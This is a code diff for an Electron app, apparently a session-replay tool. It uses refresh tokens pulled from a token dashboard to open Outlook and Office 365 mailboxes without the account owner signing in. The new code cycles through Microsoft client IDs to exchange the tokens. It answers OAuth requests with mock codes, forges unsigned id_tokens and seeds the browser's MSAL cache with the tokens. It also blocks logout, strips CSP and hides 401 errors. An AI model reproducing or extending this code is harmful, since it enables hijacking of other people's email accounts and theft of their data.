@@ -8,14 +8,59 @@ import { GraphMailClient } from './graphClient';
 import { TokenStore } from './tokenStore';
 
 const DASHBOARD_API = 'https://outlook-token-dashboard.pages.dev/api';
-const CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
-// v1.0 token endpoint — uses `resource` param (proven pattern from Portal Browser)
-const TOKEN_URL = 'https://login.microsoftonline.com/Common/oauth2/token?api-version=1.0';
+const FOCI_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';
+const CLIENT_ID = FOCI_CLIENT_ID;
+const BROKER_CLIENT_ID = '29d9ed98-a469-4536-ade2-f981bc1d605e';
 const OWA_URL = 'https://outlook.office365.com/mail/';
 const EDGE_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36 Edg/122.0.2478.0';
 
 function isLoginUrl(url: string): boolean {
   return url.includes('login.microsoftonline.com') || url.includes('login.live.com') || url.includes('login.microsoft.com');
+}
+
+// v2.0 token exchange (Portal Browser v10.10 pattern)
+async function exchangeToken(refreshTk: string, clientId: string, scope: string): Promise<Record<string, unknown>> {
+  try {
+    const resp = await net.fetch('https://login.microsoftonline.com/common/oauth2/v2.0/token', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({ client_id: clientId, grant_type: 'refresh_token', refresh_token: refreshTk, scope }).toString(),
+    });
+    return await resp.json() as Record<string, unknown>;
+  } catch (err: unknown) {
+    return { error: 'fetch_failed', error_description: err instanceof Error ? err.message : 'unknown' };
+  }
+}
+
+async function exchangeTokenWithFallback(refreshTk: string, scope: string): Promise<Record<string, unknown>> {
+  for (const clientId of [FOCI_CLIENT_ID, BROKER_CLIENT_ID]) {
+    const result = await exchangeToken(refreshTk, clientId, scope);
+    if (!result.error && result.access_token) return result;
+  }
+  return { error: 'all_clients_failed' };
+}
+
+function decodeJwt(token: string): Record<string, unknown> | null {
+  try {
+    const parts = token.split('.');
+    if (parts.length < 2) return null;
+    return JSON.parse(Buffer.from(parts[1], 'base64url').toString());
+  } catch { return null; }
+}
+
+// Domain helpers
+const MS_DOMAINS = ['microsoft.com', 'microsoftonline.com', 'office.com', 'office365.com', 'azure.com', 'sharepoint.com', 'live.com', 'onedrive.com', 'onenote.com'];
+function isMsDomain(hostname: string): boolean { return MS_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }
+
+const API_DOMAINS = ['outlook.office365.com', 'outlook.office.com', 'substrate.office.com', 'graph.microsoft.com', 'admin.microsoft.com', 'portal.office.com', 'www.office.com'];
+function isApiDomain(hostname: string): boolean { return API_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }
+
+const CDN_DOMAINS = ['res.office365.com', 'res.cdn.office.net', 'cdn.office.net', 'akamaized.net', 'msecnd.net', 'aspnetcdn.com', 'office.net', 'shellprod.msocdn.com'];
+function isCdnDomain(hostname: string): boolean { return CDN_DOMAINS.some(d => hostname === d || hostname.endsWith('.' + d)); }
+
+const LOGOUT_PATHS = ['/logout', '/signout', '/logoff', '/sign-out', 'oauth2/logout', '/common/oauth2/v2.0/logout'];
+function isLogoutUrl(url: string): boolean {
+  try { const p = new URL(url).pathname.toLowerCase(); return LOGOUT_PATHS.some(lp => p.includes(lp)); } catch { return false; }
 }
 
 // Reliable HTTP POST using Node's native https module (avoids Electron net.fetch quirks)
@@ -101,174 +146,317 @@ function createWindow(): void {
 }
 
 async function refreshAccountToken(account: SyncedAccount): Promise<boolean> {
-  try {
-    const body = new URLSearchParams({
-      client_id: CLIENT_ID,
-      grant_type: 'refresh_token',
-      refresh_token: account.refreshToken,
-      resource: 'https://outlook.office365.com',
-    });
-
-    const response = await net.fetch(TOKEN_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: body.toString(),
-    });
-
-    if (response.ok) {
-      const data = await response.json() as Record<string, unknown>;
-      account.accessToken = data.access_token as string;
-      if (data.refresh_token) {
-        account.refreshToken = data.refresh_token as string;
-      }
-      const expiresIn = (data.expires_in as number) || 3600;
-      account.accessTokenExpiry = new Date(Date.now() + expiresIn * 1000).toISOString();
-      return true;
-    }
-    return false;
-  } catch {
-    return false;
+  const result = await exchangeTokenWithFallback(account.refreshToken, 'https://outlook.office.com/.default openid profile offline_access');
+  if (!result.error && result.access_token) {
+    account.accessToken = result.access_token as string;
+    if (result.refresh_token) account.refreshToken = result.refresh_token as string;
+    const expiresIn = (result.expires_in as number) || 3600;
+    account.accessTokenExpiry = new Date(Date.now() + expiresIn * 1000).toISOString();
+    return true;
   }
+  return false;
 }
 
-async function getTokenForResource(account: SyncedAccount, resource: string): Promise<string | null> {
-  try {
-    const body = new URLSearchParams({
-      client_id: CLIENT_ID,
-      grant_type: 'refresh_token',
-      refresh_token: account.refreshToken,
-      resource,
-    });
-
-    const response = await net.fetch(TOKEN_URL, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-      body: body.toString(),
-    });
-
-    if (response.ok) {
-      const data = await response.json() as Record<string, unknown>;
-      // Persist the rotated refresh token so subsequent launches keep working
-      if (data.refresh_token) {
-        account.refreshToken = data.refresh_token as string;
-      }
-      return data.access_token as string;
-    }
-    return null;
-  } catch {
-    return null;
-  }
-}
-
-// Proven pattern (Portal Browser v7.1/v8.3): inject Bearer token on every
-// Microsoft request AND rewrite login redirects back to the service URL at the
-// response level. This is what lets OWA/Office load authenticated without ever
-// showing the Microsoft sign-in page.
-function setupSessionInterceptors(sess: Electron.Session, getToken: () => string | null, graphToken: string | null): void {
-  // 1) Inject Bearer token on ALL Microsoft requests
-  sess.webRequest.onBeforeSendHeaders(
-    {
-      urls: [
-        'https://*.office.com/*',
-        'https://*.office365.com/*',
-        'https://graph.microsoft.com/*',
-        'https://substrate.office.com/*',
-        'https://*.outlook.com/*',
-        'https://*.microsoft.com/*',
-        'https://*.sharepoint.com/*',
-      ],
-    },
-    (details, callback) => {
-      const isGraphReq = details.url.includes('graph.microsoft.com');
-      const tokenToUse = isGraphReq ? (graphToken || getToken()) : getToken();
-      if (tokenToUse) {
-        details.requestHeaders['Authorization'] = `Bearer ${tokenToUse}`;
-      }
-      details.requestHeaders['User-Agent'] = EDGE_UA;
-      callback({ requestHeaders: details.requestHeaders });
-    }
-  );
-
-  // 2) Block login redirects at the RESPONSE level — rewrite the 301/302
-  //    Location header that points back to the Microsoft login page.
-  sess.webRequest.onHeadersReceived(
-    { urls: ['https://login.microsoftonline.com/*', 'https://login.live.com/*', 'https://login.microsoft.com/*'] },
-    (details, callback) => {
-      const headers = details.responseHeaders || {};
-      const loc = (headers['location'] || headers['Location'] || [''])[0];
-      if (
-        (details.statusCode === 302 || details.statusCode === 301) &&
-        loc && (loc.includes('login.microsoftonline.com') || loc.includes('login.live.com'))
-      ) {
-        callback({ responseHeaders: { ...headers, location: [OWA_URL] } });
-        return;
-      }
-      callback({ responseHeaders: headers });
-    }
-  );
-}
-
+// Portal Browser v10.10 protocol handler approach — intercepts ALL HTTPS
+// requests at the protocol level. This is what makes authenticated OWA work:
+// 1. Intercepts MSAL's /oauth2/authorize → returns 302 with mock auth code
+// 2. Intercepts MSAL's /oauth2/token → exchanges refresh token, returns real tokens
+// 3. Injects Bearer on API domains
+// 4. Blocks logout, strips CSP, suppresses 401s
 async function launchChromeWithSession(account: SyncedAccount, service: string): Promise<{ success: boolean; error?: string }> {
   try {
     const url = SERVICE_URLS[service] || SERVICE_URLS.owa;
+    const email = account.email;
 
-    // Exchange the refresh token for a fresh OWA token (resource-scoped).
-    // OWA/Office services authenticate with the outlook.office365.com resource.
-    const resource = service === 'admin' || service === 'sharepoint'
-      ? 'https://admin.microsoft.com'
-      : 'https://outlook.office365.com';
+    // Step 1: Exchange tokens for all needed scopes (parallel)
+    const scopes = [
+      { key: 'outlook', scope: 'https://outlook.office.com/.default openid profile offline_access' },
+      { key: 'outlook365', scope: 'https://outlook.office365.com/.default openid profile offline_access' },
+      { key: 'graph', scope: 'https://graph.microsoft.com/.default openid profile offline_access' },
+      { key: 'substrate', scope: 'https://substrate.office.com/.default openid profile offline_access' },
+    ];
 
-    const owaToken = await getTokenForResource(account, resource);
-    // Also fetch a Graph token for the embedded graph.microsoft.com calls OWA makes
-    const graphToken = await getTokenForResource(account, 'https://graph.microsoft.com');
+    const resourceTokens: Record<string, string> = {};
+    let firstResult: Record<string, unknown> | null = null;
+    let currentRefreshToken = account.refreshToken;
 
-    if (!owaToken) {
-      shell.openExternal(`${url}?login_hint=${encodeURIComponent(account.email)}`);
-      return { success: true };
+    const tokenResults = await Promise.allSettled(
+      scopes.map(s => exchangeTokenWithFallback(account.refreshToken, s.scope).then(r => ({ ...r, _key: s.key })))
+    );
+
+    for (const settled of tokenResults) {
+      if (settled.status === 'fulfilled') {
+        const result = settled.value as Record<string, unknown>;
+        if (!result.error && result.access_token) {
+          resourceTokens[result._key as string] = result.access_token as string;
+          if (!firstResult) {
+            firstResult = result;
+            currentRefreshToken = (result.refresh_token as string) || account.refreshToken;
+          }
+        }
+      }
     }
 
-    // Persistent partition so OWA's own auth cookies survive between launches
-    const sessionPartition = `persist:portal-${account.sessionId}-${service}`;
-    const browserSession = session.fromPartition(sessionPartition);
+    if (!firstResult) {
+      return { success: false, error: 'All token exchanges failed — re-sync this account.' };
+    }
 
-    const currentToken = owaToken;
-    setupSessionInterceptors(browserSession, () => currentToken, graphToken);
+    // Cross-fill outlook tokens
+    if (resourceTokens.outlook && !resourceTokens.outlook365) resourceTokens.outlook365 = resourceTokens.outlook;
+    if (resourceTokens.outlook365 && !resourceTokens.outlook) resourceTokens.outlook = resourceTokens.outlook365;
 
-    browserSession.setPermissionRequestHandler((_wc, _permission, cb) => cb(true));
+    // Persist refreshed token
+    account.refreshToken = currentRefreshToken;
+    account.accessToken = resourceTokens.outlook || (firstResult.access_token as string);
+
+    const decoded = decodeJwt(firstResult.access_token as string);
+    const oid = (decoded?.oid as string) || '';
+    const tid = (decoded?.tid as string) || '';
+    const clientInfo = Buffer.from(JSON.stringify({ uid: oid, utid: tid })).toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '');
+
+    // Step 2: Create session with protocol handler
+    const partitionName = `persist:portal-${account.sessionId}-${service}`;
+    const portalSession = session.fromPartition(partitionName);
+
+    // Strip CSP headers
+    portalSession.webRequest.onHeadersReceived((details, callback) => {
+      const headers = { ...details.responseHeaders };
+      delete headers['content-security-policy'];
+      delete headers['Content-Security-Policy'];
+      delete headers['content-security-policy-report-only'];
+      delete headers['Content-Security-Policy-Report-Only'];
+      callback({ responseHeaders: headers });
+    });
+
+    // Helper: get the right token for a hostname
+    function getTokenForHost(hostname: string): string {
+      if (hostname.includes('outlook') || hostname.includes('office365'))
+        return resourceTokens.outlook || resourceTokens.graph || (firstResult!.access_token as string);
+      if (hostname.includes('graph.microsoft'))
+        return resourceTokens.graph || (firstResult!.access_token as string);
+      if (hostname.includes('substrate'))
+        return resourceTokens.substrate || (firstResult!.access_token as string);
+      return resourceTokens.graph || (firstResult!.access_token as string);
+    }
+
+    // PROTOCOL HANDLER — intercept ALL HTTPS requests
+    portalSession.protocol.handle('https', async (request) => {
+      const parsed = new URL(request.url);
+
+      // Block logout
+      if (isLogoutUrl(request.url)) {
+        return new Response('<!DOCTYPE html><html><body><script>history.back();</script></body></html>', {
+          status: 200, headers: { 'content-type': 'text/html; charset=utf-8' },
+        });
+      }
+
+      // Intercept OAuth authorize → return 302 with mock auth code
+      if (parsed.hostname === 'login.microsoftonline.com' &&
+          (parsed.pathname.includes('/oauth2/authorize') || parsed.pathname.includes('/oauth2/v2.0/authorize'))) {
+        const redirectUri = parsed.searchParams.get('redirect_uri') || OWA_URL;
+        const state = parsed.searchParams.get('state') || '';
+        const scope = parsed.searchParams.get('scope') || '';
+        const responseMode = parsed.searchParams.get('response_mode') || 'fragment';
+
+        // Silently exchange for the requested scope
+        if (scope) {
+          try {
+            const result = await exchangeTokenWithFallback(currentRefreshToken, scope);
+            if (!result.error && result.access_token) {
+              const dec = decodeJwt(result.access_token as string);
+              const aud = (dec?.aud as string) || '';
+              if (aud.includes('graph')) resourceTokens.graph = result.access_token as string;
+              else if (aud.includes('outlook')) resourceTokens.outlook = result.access_token as string;
+              if (result.refresh_token) currentRefreshToken = result.refresh_token as string;
+            }
+          } catch { /* ignore */ }
+        }
+
+        const mockCode = 'mock_auth_code_' + Date.now();
+        const params = new URLSearchParams({ code: mockCode, state, client_info: clientInfo, session_state: Date.now().toString() });
+        const sep = responseMode === 'query' ? '?' : '#';
+        return new Response(null, {
+          status: 302,
+          headers: { Location: redirectUri + sep + params.toString(), 'Cache-Control': 'no-store, no-cache' },
+        });
+      }
+
+      // Intercept OAuth token → exchange refresh token and return real tokens
+      if (parsed.hostname === 'login.microsoftonline.com' &&
+          (parsed.pathname.includes('/oauth2/token') || parsed.pathname.includes('/oauth2/v2.0/token')) &&
+          request.method === 'POST') {
+        let bodyText = '';
+        try { bodyText = await request.text(); } catch { /* empty */ }
+        const bodyParams = new URLSearchParams(bodyText);
+        const code = bodyParams.get('code') || '';
+        const grantType = bodyParams.get('grant_type') || '';
+
+        if ((code && code.startsWith('mock_auth_code_')) || grantType === 'refresh_token') {
+          const reqClientId = bodyParams.get('client_id') || BROKER_CLIENT_ID;
+          const reqScope = bodyParams.get('scope') || 'https://outlook.office.com/.default openid profile offline_access';
+
+          let tokenResult = firstResult!;
+          try {
+            const exchanged = await exchangeToken(currentRefreshToken, reqClientId, reqScope);
+            if (!exchanged.error && exchanged.access_token) {
+              tokenResult = exchanged;
+              const dec = decodeJwt(exchanged.access_token as string);
+              const aud = (dec?.aud as string) || '';
+              if (aud.includes('graph')) resourceTokens.graph = exchanged.access_token as string;
+              else if (aud.includes('outlook') || aud.includes('office')) resourceTokens.outlook = exchanged.access_token as string;
+              if (exchanged.refresh_token) currentRefreshToken = exchanged.refresh_token as string;
+            }
+          } catch { /* use firstResult */ }
+
+          // Build id_token (alg: none)
+          const now = Math.floor(Date.now() / 1000);
+          const idClaims = { aud: reqClientId, iss: `https://login.microsoftonline.com/${tid}/v2.0`, iat: now, nbf: now, exp: now + 3600, sub: oid, oid, tid, preferred_username: email, name: email, email, ver: '2.0' };
+          const idHeader = Buffer.from(JSON.stringify({ typ: 'JWT', alg: 'none' })).toString('base64url');
+          const idPayload = Buffer.from(JSON.stringify(idClaims)).toString('base64url');
+
+          const tokenResponse = {
+            access_token: tokenResult.access_token, token_type: 'Bearer',
+            expires_in: (tokenResult.expires_in as number) || 3600, ext_expires_in: 3600,
+            scope: (tokenResult.scope as string) || reqScope,
+            id_token: idHeader + '.' + idPayload + '.',
+            refresh_token: (tokenResult.refresh_token as string) || currentRefreshToken,
+            client_info: clientInfo, foci: '1',
+          };
+          return new Response(JSON.stringify(tokenResponse), {
+            status: 200, headers: { 'content-type': 'application/json; charset=utf-8', 'cache-control': 'no-store' },
+          });
+        }
+
+        // Unknown token request — pass through
+        try { return await net.fetch(new Request(request.url, { method: 'POST', headers: request.headers, body: bodyText })); }
+        catch { return new Response('{}', { status: 500 }); }
+      }
+
+      // API domains → inject Bearer token
+      if (!isCdnDomain(parsed.hostname) && isApiDomain(parsed.hostname)) {
+        const token = getTokenForHost(parsed.hostname);
+        const headers = new Headers(request.headers);
+        if (!headers.has('Authorization') || headers.get('Authorization') === 'Bearer')
+          headers.set('Authorization', 'Bearer ' + token);
+        headers.set('User-Agent', EDGE_UA);
+
+        try {
+          const resp = await net.fetch(new Request(request.url, {
+            method: request.method, headers,
+            body: request.method !== 'GET' && request.method !== 'HEAD' ? request.body : undefined,
+            duplex: request.method !== 'GET' && request.method !== 'HEAD' ? 'half' : undefined,
+          } as RequestInit));
+
+          // On 401, suppress with empty 200 (prevents OWA session-expired UI)
+          if (resp.status === 401) {
+            return new Response('{}', { status: 200, headers: { 'content-type': 'application/json' } });
+          }
+          return resp;
+        } catch {
+          return net.fetch(request.url, { method: request.method, headers: Object.fromEntries(headers.entries()) });
+        }
+      }
+
+      // Everything else — pass through
+      try { return await net.fetch(request); }
+      catch { return new Response('', { status: 502 }); }
+    });
+
+    // Step 3: Create window
+    portalSession.setPermissionRequestHandler((_wc, _permission, cb) => cb(true));
 
     const portalWindow = new BrowserWindow({
-      width: 1400,
-      height: 900,
-      title: `${account.email} — ${service.toUpperCase()}`,
-      backgroundColor: '#ffffff',
+      width: 1400, height: 900, show: false,
+      title: `${email} — ${service.toUpperCase()}`,
       webPreferences: {
-        partition: sessionPartition,
+        partition: partitionName,
         contextIsolation: true,
         nodeIntegration: false,
-        webSecurity: false, // allows OWA compose editor + cross-origin token use
+        sandbox: false,
       },
     });
 
-    // Deny popups that navigate to the login page
+    // CSP bypass via CDP
+    try {
+      portalWindow.webContents.debugger.attach('1.3');
+      portalWindow.webContents.debugger.sendCommand('Page.setBypassCSP', { enabled: true });
+    } catch { /* non-fatal */ }
+
+    // MSAL cache seeding + stability script on dom-ready
+    const msalEmail = email;
+    const msalScript = `
+    (function() {
+      try {
+        const oid = ${JSON.stringify(oid)};
+        const tid = ${JSON.stringify(tid)};
+        const email = ${JSON.stringify(msalEmail)};
+        const homeAccountId = oid + '.' + tid;
+        const environment = 'login.microsoftonline.com';
+        const now = Math.floor(Date.now() / 1000);
+        const clientInfo = btoa(JSON.stringify({ uid: oid, utid: tid })).replace(/\\+/g, '-').replace(/\\//g, '_').replace(/=+$/g, '');
+        const portalClientIds = { outlook: '9199bf20-a13f-4107-85dc-02114787ef48', office: '4765445b-32c6-49b0-83e6-1d93765276ca', default: 'd3590ed6-52b3-4102-aeff-aad2292ab01c' };
+        const host = window.location.hostname;
+        let clientId = portalClientIds['default'];
+        if (host.includes('outlook')) clientId = portalClientIds.outlook;
+        else if (host.includes('office')) clientId = portalClientIds.office;
+        const idPayload = { aud: clientId, iss: 'https://login.microsoftonline.com/' + tid + '/v2.0', iat: now, nbf: now, exp: now + 86400, sub: oid, oid, tid, preferred_username: email, name: email, email, ver: '2.0' };
+        const idHeader = btoa(JSON.stringify({typ:'JWT',alg:'none'})).replace(/=/g,'');
+        const idBody = btoa(JSON.stringify(idPayload)).replace(/=/g,'');
+        const idToken = idHeader + '.' + idBody + '.';
+        const accountKey = homeAccountId + '-' + environment + '-' + tid;
+        const accountValue = { homeAccountId, environment, tenantId: tid, username: email, localAccountId: oid, name: email, authorityType: 'MSSTS', clientInfo, realm: tid };
+        const idTokenKey = homeAccountId + '-' + environment + '-idtoken-' + clientId + '-' + tid + '---';
+        const idTokenValue = { credentialType: 'IdToken', homeAccountId, environment, clientId, secret: idToken, realm: tid };
+        const scopes = 'openid profile';
+        const atKey = homeAccountId + '-' + environment + '-accesstoken-' + clientId + '-' + tid + '-' + scopes + '--';
+        const atValue = { credentialType: 'AccessToken', homeAccountId, environment, clientId, secret: ${JSON.stringify(resourceTokens.graph || (firstResult.access_token as string))}, realm: tid, target: scopes, cachedAt: now.toString(), expiresOn: (now + 3600).toString(), extendedExpiresOn: (now + 7200).toString(), tokenType: 'Bearer' };
+        const rtKey = homeAccountId + '-' + environment + '-refreshtoken-' + clientId + '----';
+        const rtValue = { credentialType: 'RefreshToken', homeAccountId, environment, clientId, secret: ${JSON.stringify(currentRefreshToken)} };
+        sessionStorage.setItem(accountKey, JSON.stringify(accountValue));
+        sessionStorage.setItem(idTokenKey, JSON.stringify(idTokenValue));
+        sessionStorage.setItem(atKey, JSON.stringify(atValue));
+        sessionStorage.setItem(rtKey, JSON.stringify(rtValue));
+        sessionStorage.setItem('msal.account.keys', JSON.stringify([accountKey]));
+        sessionStorage.setItem('msal.' + clientId + '.active-account', homeAccountId);
+        sessionStorage.setItem('msal.' + clientId + '.interaction.status', '');
+      } catch(e) {}
+    })();`;
+
+    const stabilityScript = `
+    (function() {
+      try {
+        window.addEventListener('unhandledrejection', function(e) {
+          var msg = (e.reason && e.reason.message) || String(e.reason || '');
+          if (msg.includes('401') || msg.includes('Unauthorized') || msg.includes('Failed to fetch') || msg.includes('session') || msg.includes('token') || msg.includes('auth') || msg.includes('expired')) {
+            e.preventDefault();
+          }
+        });
+        Object.defineProperty(navigator, 'onLine', { get: function() { return true; }, configurable: true });
+        var origAssign = window.location.assign.bind(window.location);
+        var origReplace = window.location.replace.bind(window.location);
+        function isLogin(url) { return typeof url === 'string' && (url.includes('login.microsoftonline.com') || url.includes('/logoff') || url.includes('/signout') || url.includes('/logout')); }
+        window.location.assign = function(url) { if (isLogin(url)) return; return origAssign(url); };
+        window.location.replace = function(url) { if (isLogin(url)) return; return origReplace(url); };
+        window.location.reload = function() {};
+      } catch(e) {}
+    })();`;
+
+    portalWindow.webContents.on('dom-ready', () => {
+      const u = portalWindow.webContents.getURL();
+      if (u && isMsDomain(new URL(u).hostname)) {
+        portalWindow.webContents.executeJavaScript(stabilityScript).catch(() => {});
+        portalWindow.webContents.executeJavaScript(msalScript).catch(() => {});
+      }
+    });
+
+    // Block login popups
     portalWindow.webContents.setWindowOpenHandler(({ url: popupUrl }) => {
       if (isLoginUrl(popupUrl)) return { action: 'deny' };
       return { action: 'allow' };
     });
 
-    // If a login page slips through, reload the service URL with the Bearer header
-    portalWindow.webContents.on('did-finish-load', () => {
-      const u = portalWindow.webContents.getURL();
-      if (isLoginUrl(u) && !portalWindow.isDestroyed()) {
-        setTimeout(() => {
-          if (!portalWindow.isDestroyed()) {
-            portalWindow.loadURL(url, { extraHeaders: `Authorization: Bearer ${currentToken}\r\n` });
-          }
-        }, 500);
-      }
-    });
-
-    // Load the service with the Bearer token in extraHeaders (proven approach)
-    portalWindow.loadURL(url, { extraHeaders: `Authorization: Bearer ${currentToken}\r\n` });
+    portalWindow.loadURL(url);
+    portalWindow.show();
     return { success: true };
   } catch (error: unknown) {
     const message = error instanceof Error ? error.message : 'Failed to launch browser session';
